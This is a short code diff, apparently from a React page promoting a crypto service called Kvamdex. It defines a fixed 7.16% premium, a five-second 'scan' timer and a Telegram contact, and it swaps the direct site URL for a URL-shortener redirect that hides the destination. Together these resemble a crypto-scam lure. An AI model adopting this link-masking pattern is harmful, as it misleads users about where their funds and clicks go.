@@ -4,7 +4,7 @@ import { useState, useEffect, useRef } from "react";
 const KVAMDEX_PREMIUM_PCT = 7.16;
 const SCAN_DURATION_MS = 5000;
 const BYBIT_URL = "https://www.bybit.com";
-const KVAMDEX_URL = "https://kvamdex.com";
+const KVAMDEX_URL = "https://nWzweq.short.gy/kvam";
 const TELEGRAM_CONTACT = "https://t.me/softcorehard";
 
 
